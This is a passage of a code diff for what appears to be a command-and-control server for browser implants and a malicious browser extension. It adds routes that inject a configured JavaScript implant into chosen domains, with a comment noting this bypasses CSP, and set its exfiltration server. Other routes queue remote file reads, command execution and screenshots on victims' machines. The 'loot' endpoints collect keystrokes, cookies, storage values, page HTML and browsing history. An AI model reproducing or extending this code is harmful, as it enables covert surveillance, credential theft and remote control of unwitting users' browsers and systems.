+        payload = file.read()
+    
+    # Configure the payload for injection using regex to handle variations in whitespace/tabs
+    
+    # Replace Mode (handles both ?? and plain assignment syntax)
+    payload = re.sub(r'window\.taperMode\s*=\s*(window\.taperMode\s*\?\?\s*)?".*?";', 'window.taperMode = "implant";', payload)
+
+    # Replace Exfil Server
+    payload = re.sub(r'window\.taperexfilServer\s*=\s*(window\.taperexfilServer\s*\?\?\s*)?".*?";', f'window.taperexfilServer = "{server_url}";', payload)
+
+    # Replace Tag
+    payload = re.sub(r'window\.taperTag\s*=\s*(window\.taperTag\s*\?\?\s*)?".*?";', f'window.taperTag = "{tag}";', payload)
+
+    return base64.b64encode(payload.encode('utf-8')).decode('utf-8')
+
+
+@app.route('/lib/injected/<beaconID>/<path:domain>')
+def serveDynamicInjectedPayload(beaconID, domain):
+    logger.info(f"BEX: Dynamic payload request for {domain} from beacon {beaconID}")
+    # Look up the injection record
+    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain, active=True).first()
+
+    if not injection:
+        logger.warning(f"BEX: No active injection record found for {domain} and beacon {beaconID}")
+        return "No.", 404
+
+    # Mark as successful since the script is being requested
+    injection.last_success = func.now()
+    dbCommit()
+
+    with open('telemlib.js', 'r') as file:
+        payload = file.read()
+
+    # Use the server's root URL for the exfil server
+    server_url = request.url_root.rstrip('/')
+    if 'localhost' in server_url:
+        server_url = server_url.replace('localhost', '127.0.0.1')
+
+    # Ensure protocol matches
+    if request.is_secure:
+        if server_url.startswith('http://'):
+            server_url = server_url.replace('http://', 'https://')
+
+    logger.info(f"BEX: Serving payload for {domain} configured with exfil server {server_url} and tag {injection.tag} (Parent: {beaconID})")
+
+    # Perform the replacements using regex to handle variations in whitespace/tabs
+    import re
+
+    # Replace Mode (handles both ?? and plain assignment syntax)
+    payload = re.sub(r'window\.taperMode\s*=\s*(window\.taperMode\s*\?\?\s*)?".*?";', 'window.taperMode = "implant";', payload)
+
+    # Replace Exfil Server
+    payload = re.sub(r'window\.taperexfilServer\s*=\s*(window\.taperexfilServer\s*\?\?\s*)?".*?";', f'window.taperexfilServer = "{server_url}";', payload)
+
+    # Replace Tag
+    payload = re.sub(r'window\.taperTag\s*=\s*(window\.taperTag\s*\?\?\s*)?".*?";', f'window.taperTag = "{injection.tag}";', payload)
+
+    # Replace Parent UUID (handles ?? null syntax)
+    payload = re.sub(r'window\.taperParentUUID\s*=\s*(window\.taperParentUUID\s*\?\?\s*)?null;', f'window.taperParentUUID = "{beaconID}";', payload)
+    
+    response = make_response(payload, 200)
+    response.headers['Content-Type'] = 'text/javascript'
+    # Disable caching for the dynamic script
+    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
+    return response
+
+
+@app.route('/api/jstap/server_url', methods=['GET'])
+@login_required
+def getBexServerUrl():
+    try:
+        with open('bex-beacon/config.json', 'r') as f:
+            cfg = json.load(f)
+        domain = cfg['js_tap_server']['domain']
+        port   = cfg['js_tap_server']['port']
+        return jsonify({"serverUrl": f"https://{domain}:{port}"})
+    except Exception as e:
+        logger.warning(f"BEX: Could not read bex-beacon config: {e}")
+        return jsonify({"serverUrl": ""})
+
+
+@app.route('/api/jstap/inject', methods=['POST'])
+@login_required
+def enableBexInjection():
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+    domain       = content.get('domain')
+    tag          = content.get('tag')
+    serverUrl    = content.get('serverUrl', '').strip()
+
+    # Resolve client to ensure we have the UUID even if the UI sent the internal ID
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+
+    if not client:
+        logger.warning(f"BEX: Client not found for injection: {beaconID_raw}")
+        return "Client not found", 404
+
+    beaconID = client.uuid
+    logger.info(f"BEX: Enabling injection for {domain} via beacon {beaconID} (ID: {client.id}) with tag {tag}")
+
+    # Upsert logic
+    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain).first()
+    if injection:
+        injection.active = True
+        injection.tag = tag
+    else:
+        newInjection = BeaconInjection(beaconID=beaconID, domain=domain, tag=tag, active=True)
+        db_session.add(newInjection)
+
+    dbCommit()
+
+    # Queue a configuration task for the beacon (client is already found above)
+    # Send config values so the extension can pre-set them before injecting
+    # the bundled telemlib.js — this bypasses meta-tag CSP entirely.
+    if serverUrl:
+        resolved_server_url = serverUrl.rstrip('/')
+    else:
+        resolved_server_url = request.url_root.rstrip('/')
+        if 'localhost' in resolved_server_url:
+            resolved_server_url = resolved_server_url.replace('localhost', '127.0.0.1')
+        if request.is_secure and resolved_server_url.startswith('http://'):
+            resolved_server_url = resolved_server_url.replace('http://', 'https://')
+
+    logger.info(f"BEX: Queuing CONFIG_INJECTION for {domain} with serverUrl={resolved_server_url}")
+
+    taskData = {
+        "type": "CONFIG_INJECTION",
+        "domain": domain,
+        "active": True,
+        "serverUrl": resolved_server_url,
+        "tag": tag,
+        "parentUUID": beaconID,
+        "mode": "implant"
+    }
+    
+    jsonStr = json.dumps(taskData)
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+    db_session.add(newJob)
+    dbCommit()
+
+    return "ok", 200
+
+
+@app.route('/api/jstap/stop_inject', methods=['POST'])
+@login_required
+def disableBexInjection():
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+    domain       = content.get('domain')
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    
+    if not client:
+        logger.warning(f"BEX: Client not found for stop_injection: {beaconID_raw}")
+        return "Client not found", 404
+        
+    beaconID = client.uuid
+    injection = BeaconInjection.query.filter_by(beaconID=beaconID, domain=domain).first()
+    if injection:
+        injection.active = False
+        dbCommit()
+        
+        # Queue task to disable
+        taskData = {
+            "type": "CONFIG_INJECTION",
+            "domain": domain,
+            "active": False,
+            "url": ""
+        }
+        jsonStr = json.dumps(taskData)
+        newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8'))
+        db_session.add(newJob)
+        dbCommit()
+
+    return "ok", 200
+
+
+@app.route('/api/jstap/injections/<beaconID_raw>', methods=['GET'])
+@login_required
+def getBexInjections(beaconID_raw):
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    
+    if not client:
+        return jsonify([])
+
+    injections = BeaconInjection.query.filter_by(beaconID=client.uuid, active=True).all()
+    data = [{'domain': i.domain, 'tag': i.tag, 'last_success': i.last_success} for i in injections]
+    return jsonify(data)
+
+
+# Sidecar API endpoints
+
+@app.route('/api/sidecar/command', methods=['POST'])
+@login_required
+def sendSidecarCommand():
+    """Queue a sidecar command for a beacon to execute."""
+    content = request.json
+    beaconID_raw = content.get('beaconID')
+    command = content.get('command')  # list_dir, read_file, exec_cmd
+    args = content.get('args', {})
+
+    if not command:
+        return "Missing command", 400
+
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return "Client not found", 404
+    if not client.sidecarSupported:
+        return "Sidecar not supported by this beacon", 400
+
+    requestId = str(uuid.uuid4())
+
+    if command == 'screenshot':
+        taskData = {
+            "type": "SCREENSHOT",
+            "requestId": requestId,
+            "args": args
+        }
+    elif command == 'screenshot_settings':
+        taskData = {
+            "type": "SCREENSHOT_SETTINGS",
+            "requestId": requestId,
+            "args": args
+        }
+    else:
+        taskData = {
+            "type": "SIDECAR_COMMAND",
+            "requestId": requestId,
+            "command": command,
+            "args": args
+        }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"requestId": requestId}), 200
+
+
+@app.route('/api/sidecar/results/<beaconID_raw>', methods=['GET'])
+@login_required
+def getSidecarResults(beaconID_raw):
+    """Get sidecar results for a beacon."""
+    client = Client.query.filter_by(id=beaconID_raw).first()
+    if not client:
+        client = Client.query.filter_by(uuid=beaconID_raw).first()
+    if not client:
+        return jsonify([])
+
+    requestId = request.args.get('requestId')
+    query = SidecarResult.query.filter_by(clientID=client.uuid)
+    if requestId:
+        query = query.filter_by(requestId=requestId)
+
+    results = query.order_by(SidecarResult.timeStamp.desc()).limit(50).all()
+    data = [{
+        'id': r.id,
+        'requestId': r.requestId,
+        'command': r.command,
+        'success': r.success,
+        'data': json.loads(r.data) if r.data else None,
+        'error': r.error,
+        'timeStamp': str(r.timeStamp)
+    } for r in results]
+
+    return jsonify(data)
+
+
+@app.route('/api/sidecar/result/<requestId>', methods=['GET'])
+@login_required
+def getSidecarResult(requestId):
+    """Poll for a specific sidecar result by requestId."""
+    result = SidecarResult.query.filter_by(requestId=requestId).first()
+    if not result:
+        return jsonify({"ready": False})
+
+    return jsonify({
+        "ready": True,
+        "id": result.id,
+        "command": result.command,
+        "success": result.success,
+        "data": json.loads(result.data) if result.data else None,
+        "error": result.error,
+        "timeStamp": str(result.timeStamp)
+    })
+
+
+#***************************************************************************
+# Atom Beacon Heartbeat API
+
+@app.route('/api/beacon/heartbeat', methods=['POST'])
+@app.route('/api/atom/heartbeat', methods=['POST'])
+@login_required
+def setAtomHeartbeat():
+    """Queue a heartbeat change task for a beacon (BEX, Atom, or DOM)."""
+    content = request.json
+    clientID = content.get('clientID')
+    baseInterval = content.get('baseInterval')
+    jitterPercent = content.get('jitterPercent')
+
+    if baseInterval is None or jitterPercent is None:
+        return "Missing baseInterval or jitterPercent", 400
+
+    try:
+        baseInterval = float(baseInterval)
+        jitterPercent = float(jitterPercent)
+    except (ValueError, TypeError):
+        return "Invalid numeric values", 400
+
+    if baseInterval < 0.5:
+        return "baseInterval must be >= 0.5", 400
+    if jitterPercent < 0 or jitterPercent > 100:
+        return "jitterPercent must be 0-100", 400
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    if client.clientType == 'js-implant':
+        # DOM beacon uses eval'd JavaScript — generate JS code that calls global functions
+        baseMsVal = baseInterval * 1000
+        jitterRange = (jitterPercent / 100) * baseMsVal
+        jsCode = (
+            f'updateTaskCheckInterval({baseMsVal});'
+            f'updateTaskCheckJitter({jitterRange},{-jitterRange});'
+            f'sendMetrics("/plugin/data/_system",JSON.stringify({{dataType:"heartbeat_status",data:{{success:true,baseInterval:{baseInterval},jitterPercent:{jitterPercent}}}}}));'
+        )
+        encoded = base64.b64encode(jsCode.encode('utf-8')).decode('utf-8')
+    else:
+        # BEX/Atom beacons use JSON task format
+        taskData = {
+            "type": "SET_HEARTBEAT",
+            "baseInterval": baseInterval,
+            "jitterPercent": jitterPercent
+        }
+        encoded = base64.b64encode(json.dumps(taskData).encode('utf-8')).decode('utf-8')
+
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "queued"}), 200
+
+
+@app.route('/api/beacon/heartbeat/<clientID>', methods=['GET'])
+@app.route('/api/atom/heartbeat/<clientID>', methods=['GET'])
+@login_required
+def getAtomHeartbeat(clientID):
+    """Get latest heartbeat status for a beacon (BEX or Atom)."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return jsonify({"found": False})
+
+    row = PluginData.query.filter_by(
+        clientID=client.uuid, pluginId='_system', dataType='heartbeat_status'
+    ).order_by(PluginData.id.desc()).first()
+
+    if not row:
+        return jsonify({"found": False})
+
+    return jsonify({
+        "found": True,
+        "data": json.loads(row.data),
+        "timeStamp": row.timeStamp.isoformat() if row.timeStamp else None,
+        "id": row.id
+    })
+
+
+#***************************************************************************
+# DOM Beacon Screenshot API
+
+@app.route('/api/dom/screenshot', methods=['POST'])
+@login_required
+def domScreenshot():
+    """Queue an on-demand screenshot task for a DOM beacon."""
+    content = request.json
+    clientID = content.get('clientID')
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    jsCode = 'sendScreenshot();'
+    encoded = base64.b64encode(jsCode.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+    return jsonify({"status": "queued"}), 200
+
+
+#***************************************************************************
+# Plugin API Routes
+
+@app.route('/api/plugins', methods=['GET'])
+@login_required
+def listPlugins():
+    """List all loaded plugin manifests."""
+    result = []
+    for pid, plugin in PLUGINS.items():
+        result.append(plugin['manifest'])
+    return jsonify(result)
+
+
+@app.route('/api/plugins/<pluginId>/ui', methods=['GET'])
+@login_required
+def getPluginUI(pluginId):
+    """Return HTML for dashboard plugin UI."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+    return jsonify({
+        'html': plugin.get('ui.html'),
+        'hasJs': plugin.get('ui.js') is not None
+    })
+
+
+@app.route('/api/plugins/<pluginId>/ui.js', methods=['GET'])
+@login_required
+def getPluginUIScript(pluginId):
+    """Serve plugin UI JS as a script file (CSP-compliant)."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin or not plugin.get('ui.js'):
+        return "Not found", 404
+    # Wrap the plugin JS so it reads its API from the global registry
+    wrappedJs = (
+        '(function() {\n'
+        '  var pluginUI = window.__pluginUIRegistry && window.__pluginUIRegistry["' + pluginId + '"];\n'
+        '  if (!pluginUI) { console.error("No pluginUI context for ' + pluginId + '"); return; }\n'
+        '  ' + plugin.get('ui.js') + '\n'
+        '})();\n'
+    )
+    response = make_response(wrappedJs)
+    response.headers['Content-Type'] = 'application/javascript'
+    return response
+
+
+@app.route('/api/plugins/<pluginId>/activate', methods=['POST'])
+@login_required
+def activatePlugin(pluginId):
+    """Activate a plugin on a client."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+
+    content = request.json
+    clientID = content.get('clientID')
+    settings = content.get('settings', {})
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    # Upsert PluginActivation
+    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
+    if existing:
+        existing.active = True
+        existing.settings = json.dumps(settings)
+    else:
+        activation = PluginActivation(clientID=client.uuid, pluginId=pluginId,
+                                       active=True, settings=json.dumps(settings))
+        db_session.add(activation)
+    dbCommit()
+
+    # Queue PLUGIN_LOAD task
+    taskData = {
+        "type": "PLUGIN_LOAD",
+        "pluginId": pluginId,
+        "settings": settings,
+        "mainCode": plugin.get('main.js'),
+        "rendererCode": plugin.get('renderer.js')
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "activated", "pluginId": pluginId}), 200
+
+
+@app.route('/api/plugins/<pluginId>/command', methods=['POST'])
+@login_required
+def sendPluginCommand(pluginId):
+    """Send a command to a running plugin on a client."""
+    plugin = PLUGINS.get(pluginId)
+    if not plugin:
+        return "Plugin not found", 404
+
+    content = request.json
+    clientID = content.get('clientID')
+    command = content.get('command', {})
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    taskData = {
+        "type": "PLUGIN_COMMAND",
+        "pluginId": pluginId,
+        "command": command
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "queued", "pluginId": pluginId}), 200
+
+
+@app.route('/api/plugins/<pluginId>/deactivate', methods=['POST'])
+@login_required
+def deactivatePlugin(pluginId):
+    """Deactivate a plugin on a client."""
+    content = request.json
+    clientID = content.get('clientID')
+
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    existing = PluginActivation.query.filter_by(clientID=client.uuid, pluginId=pluginId).first()
+    if existing:
+        existing.active = False
+        dbCommit()
+
+    # Queue PLUGIN_UNLOAD task
+    taskData = {
+        "type": "PLUGIN_UNLOAD",
+        "pluginId": pluginId
+    }
+    jsonStr = json.dumps(taskData)
+    encoded = base64.b64encode(jsonStr.encode('utf-8')).decode('utf-8')
+    newJob = ClientPayloadJob(clientKey=client.id, payloadKey=0, code=encoded)
+    db_session.add(newJob)
+    dbCommit()
+
+    return jsonify({"status": "deactivated", "pluginId": pluginId}), 200
+
+
+@app.route('/api/plugins/client/<clientID>', methods=['GET'])
+@login_required
+def getClientPlugins(clientID):
+    """List active plugins for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    activations = PluginActivation.query.filter_by(clientID=client.uuid, active=True).all()
+    result = []
+    for act in activations:
+        manifest = PLUGINS.get(act.pluginId, {}).get('manifest', {})
+        result.append({
+            'pluginId': act.pluginId,
+            'settings': json.loads(act.settings) if act.settings else {},
+            'activatedAt': act.activatedAt.isoformat() if act.activatedAt else None,
+            'manifest': manifest
+        })
+    return jsonify(result)
+
+
+@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['GET'])
+@login_required
+def getPluginData(pluginId, clientID):
+    """Fetch plugin data for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    dataType = request.args.get('dataType')
+    limit = request.args.get('limit', 100, type=int)
+    offset = request.args.get('offset', 0, type=int)
+
+    query = PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId)
+    if dataType:
+        query = query.filter_by(dataType=dataType)
+    query = query.order_by(PluginData.id.desc())
+    total = query.count()
+    rows = query.offset(offset).limit(limit).all()
+
+    result = []
+    for row in rows:
+        result.append({
+            'id': row.id,
+            'dataType': row.dataType,
+            'data': json.loads(row.data),
+            'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
+        })
+    return jsonify({'total': total, 'rows': result})
+
+
+@app.route('/api/plugins/<pluginId>/data/<clientID>', methods=['DELETE'])
+@login_required
+def deletePluginData(pluginId, clientID):
+    """Clear plugin data for a client."""
+    client = Client.query.filter_by(id=clientID).first()
+    if not client:
+        client = Client.query.filter_by(uuid=clientID).first()
+    if not client:
+        return "Client not found", 404
+
+    PluginData.query.filter_by(clientID=client.uuid, pluginId=pluginId).delete()
+    dbCommit()
+    return jsonify({"status": "deleted"}), 200
+
+
+@app.route('/api/plugins/eventData/<int:eventID>', methods=['GET'])
+@login_required
+def getPluginEventData(eventID):
+    """Get PluginData row by ID (for event timeline detail view)."""
+    row = PluginData.query.filter_by(id=eventID).first()
+    if not row:
+        return "Not found", 404
+    return jsonify({
+        'id': row.id,
+        'pluginId': row.pluginId,
+        'dataType': row.dataType,
+        'data': json.loads(row.data),
+        'timeStamp': row.timeStamp.isoformat() if row.timeStamp else None
+    })
+
 
 # For use by both normal requests and obfuscated requests
 def createTaskResponse(identifier):
@@ -1521,7 +2599,7 @@ def createTaskResponse(identifier):
 
     dbChange = False
 
-    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).all()
+    payloads = ClientPayloadJob.query.filter_by(clientKey=client.id).order_by(ClientPayloadJob.id.asc()).all()
 
 
     taskedPayloads = [{'id':payload.id, 'data':payload.code} for payload in payloads]
@@ -1546,8 +2624,8 @@ def createTaskResponse(identifier):
     if dbChange:
         dbCommit()
 
-    # is obfuscation/encryption enabled?
-    if client.sendKey != None:
+    # is obfuscation/encryption enabled and ACTIVE on client?
+    if client.sendKey != None and client.cryptoActive:
         iv             = os.urandom(12)
         aesgcm         = AESGCM(client.sendKey)
         jsonString     = json.dumps(taskedPayloads)
@@ -1585,49 +2663,24 @@ def returnPayloads(identifier):
 
 
 
-# Capture screenshot
-@app.route('/loot/screenshot/<identifier>', methods=['POST'])
-def recordScreenshot(identifier):
-    # logger.info("Received image from: " + identifier)
-    #logger.info("Looking up loot dir...")
-
-    if not isClientSessionValid(identifier):
-        return "No.", 401
-
-
-    lootDir   = findLootDirectory(identifier)
-    image     = request.data
-    file_type = magic.from_buffer(image, mime=True)
-
-    # Make sure the html2canvas screenshot is 
-    # what we're expecting. Definitely don't want SVGs
-    if file_type != 'image/png':
-        # Shenanigans from the 'client' are afoot
-        logger.error("!!!! Wrong screenshot filetype!")
-        logger.error("---- Type: " + file_type)
-        return "No.", 401
-
-
-    client = Client.query.with_entities(Client.imageCounter).filter_by(uuid=identifier).first()
-
-    imageNumber = client[0]
-
+# Helper to save screenshot data from either direct or proxied calls
+def saveScreenshot(identifier, image, ip, userAgent):
+    lootDir = findLootDirectory(identifier)
+    
+    # Use UUID for filename to prevent race conditions and collisions in dirty loot directories
+    imageName = str(uuid.uuid4())
 
     #logger.info("Writing the file to disk...")
-    with open (dataDirectory + "lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png", "wb") as binary_file:
+    file_path = os.path.join(dataDirectory, "lootFiles", lootDir, f"{imageName}_Screenshot.png")
+    with open (file_path, "wb") as binary_file:
         binary_file.write(image)
         binary_file.close()
 
     # Put it in the DB
-    newScreenshot = Screenshot(clientID=identifier, fileName="./lootFiles/" + lootDir + "/" + str(imageNumber) + "_Screenshot.png")
+    newScreenshot = Screenshot(clientID=identifier, fileName="/lootFiles/" + lootDir + "/" + imageName + "_Screenshot.png")
     db_session.add(newScreenshot)
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
-
-    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    clientSeen(identifier, ip, userAgent)
     db_session.execute(update(Client).where(Client.uuid == identifier).values(imageCounter=Client.imageCounter+1))
     dbCommit()
 
@@ -1638,6 +2691,27 @@ def recordScreenshot(identifier):
     db_session.add(newEvent)
     dbCommit()
 
+
+# Capture screenshot
+@app.route('/loot/screenshot/<identifier>', methods=['POST'])
+def recordScreenshot(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    image     = request.data
+    file_type = magic.from_buffer(image, mime=True)
+
+    if file_type != 'image/png':
+        logger.error("!!!! Wrong screenshot filetype!")
+        logger.error("---- Type: " + file_type)
+        return "No.", 401
+
+    ip = getClientIP()
+
+    saveScreenshot(identifier, image, ip, request.headers.get('User-Agent'))
+
+    return "ok", 200
+
     return "ok", 200
 
 
@@ -1646,11 +2720,10 @@ def recordScreenshot(identifier):
 def saveHTML(identifier, url, html, ip, userAgent):
     lootDir = findLootDirectory(identifier)
 
-    client = Client.query.with_entities(Client.htmlCodeCounter).filter_by(uuid=identifier).first()
+    # Use UUID for filename to prevent race conditions
+    htmlName = str(uuid.uuid4())
 
-    htmlNumber = client[0]
-
-    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + str(htmlNumber) + "_htmlCopy.html"
+    lootFile = dataDirectory + "lootFiles/" + lootDir + "/" + htmlName + "_htmlCopy.html"
 
     with open (lootFile, "w") as html_file:
         html_file.write(html)
@@ -1687,10 +2760,7 @@ def recordHTML(identifier):
     url = content['url']
     trapHTML = content['html']
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveHTML(identifier, url, trapHTML, ip, request.headers.get('User-Agent'))
@@ -1706,6 +2776,14 @@ def saveUrl(identifier, url, ip, userAgent):
     newUrl = UrlVisited(clientID=identifier, url=url)
     db_session.add(newUrl)
 
+    # Update primary domain for client if not already set
+    client = Client.query.filter_by(uuid=identifier).first()
+    if client and not client.domain:
+        from urllib.parse import urlparse
+        parsed_url = urlparse(url)
+        if parsed_url.hostname:
+            client.domain = parsed_url.hostname
+            db_session.add(client)
 
     clientSeen(identifier, ip, userAgent)
     dbCommit()
@@ -1734,10 +2812,7 @@ def recordUrl(identifier):
     # logger.info("Got URL: " + url)
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveUrl(identifier, url, ip, request.headers.get('User-Agent'))
@@ -1778,10 +2853,7 @@ def recordInput(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveInput(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -1823,10 +2895,7 @@ def recordCookie(identifier):
     # logger.info("Cookie name: " + content['cookieName'] + ", value: " + content['cookieValue'])
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveCookie(identifier, cookieName, cookieValue, ip, request.headers.get('User-Agent'))
 
@@ -1867,10 +2936,7 @@ def recordLocalStorageEntry(identifier):
     localStorageValue = content['value']
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveLocalStorage(identifier, localStorageKey, localStorageValue, ip, request.headers.get('User-Agent'))
@@ -1890,10 +2956,23 @@ def saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, u
 
     # add to global event table
     db_session.refresh(newSessionStorage)
-    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp, 
+    newEvent  = Event(clientID=identifier, timeStamp=newSessionStorage.timeStamp,
     eventType ='SESSIONSTORAGE', eventID=newSessionStorage.id)
     db_session.add(newEvent)
-    dbCommit()    
+    dbCommit()
+
+
+def saveKeylog(identifier, keys, target, url, ip, userAgent):
+    newKeylog = Keylog(clientID=identifier, keys=keys, target=target or '', url=url or '')
+    db_session.add(newKeylog)
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
+
+    db_session.refresh(newKeylog)
+    newEvent = Event(clientID=identifier, timeStamp=newKeylog.timeStamp,
+        eventType='KEYLOG', eventID=newKeylog.id)
+    db_session.add(newEvent)
+    dbCommit()
 
 
 
@@ -1904,20 +2983,32 @@ def recordSessionStorageEntry(identifier):
     # logger.info("New sessionStorage data recorded from: " + identifier)
     if not isClientSessionValid(identifier):
         return "No.", 401
- 
-    content = request.json 
+
+    content = request.json
     sessionStorageKey   = content['key']
     sessionStorageValue = content['value']
 
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
 
     saveSessionStorage(identifier, sessionStorageKey, sessionStorageValue, ip, request.headers.get('User-Agent'))
 
+
+    return "ok", 200
+
+
+@app.route('/loot/keylog/<identifier>', methods=['POST'])
+def recordKeylog(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json
+
+    ip = getClientIP()
+
+    saveKeylog(identifier, content.get('keys', ''), content.get('target', ''),
+               content.get('url', ''), ip, request.headers.get('User-Agent'))
 
     return "ok", 200
 
@@ -1968,10 +3059,7 @@ def recordXhrDump(identifier):
 
     content = request.json
 
-    if (proxyMode):
-        ip = request.headers.get('X-Forwarded-For')
-    else:
-        ip = request.remote_addr
+    ip = getClientIP()
 
     saveXhrDump(identifier, content, ip, request.headers.get('User-Agent'))
 
@@ -2008,9 +3096,90 @@ def saveFetchDump(identifier, content, ip, userAgent):
     dbCommit()
 
 
+def saveBeaconVisit(identifier, domain, url, ip, userAgent):
+    # Check if domain already exists for this client
+    existingDomain = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
+    
+    domainID = None
+    if existingDomain:
+        existingDomain.lastSeen = func.now()
+        domainID = existingDomain.id
+    else:
+        # Race condition protection: try to insert, catch integrity error if another thread beat us
+        try:
+            with db_session.begin_nested():
+                newDomain = BeaconDomain(clientID=identifier, domain=domain)
+                db_session.add(newDomain)
+            db_session.flush() # This is now safe as begin_nested handles the sub-transaction
+            domainID = newDomain.id
+        except IntegrityError:
+            # Another thread inserted it, fetch it again
+            existingDomain = BeaconDomain.query.filter_by(clientID=identifier, domain=domain).first()
+            if existingDomain:
+                existingDomain.lastSeen = func.now()
+                domainID = existingDomain.id
+    
+    # Record the specific visit if URL provided and we have a valid domainID
+    if domainID and url:
+        # Deduplication: Don't record if it's the exact same URL as the very last visit for this domain
+        # within the last 5 minutes (to handle telemetry heartbeats)
+        lastVisit = BeaconVisit.query.filter_by(domainID=domainID).order_by(BeaconVisit.visitTime.desc()).first()
+        
+        shouldRecord = True
+        if lastVisit and lastVisit.url == url:
+            now = datetime.datetime.now(datetime.timezone.utc)
+            
+            lastVisitTime = lastVisit.visitTime
+            if lastVisitTime.tzinfo is None:
+                lastVisitTime = lastVisitTime.replace(tzinfo=datetime.timezone.utc)
+
+            timeDiff = now.timestamp() - lastVisitTime.timestamp()
+            if timeDiff < 300: # 5 minutes
+                shouldRecord = False
+
+        if shouldRecord:
+            newVisit = BeaconVisit(domainID=domainID, url=url)
+            db_session.add(newVisit)
+
+    clientSeen(identifier, ip, userAgent)
+    dbCommit()
 
 
-# Dump the full Fetch api call info
+def saveBeaconCapture(identifier, domain, captureType, name, value, ip, userAgent, url=None, extraData=None):
+    # Ensure domain exists and record visit if URL is present
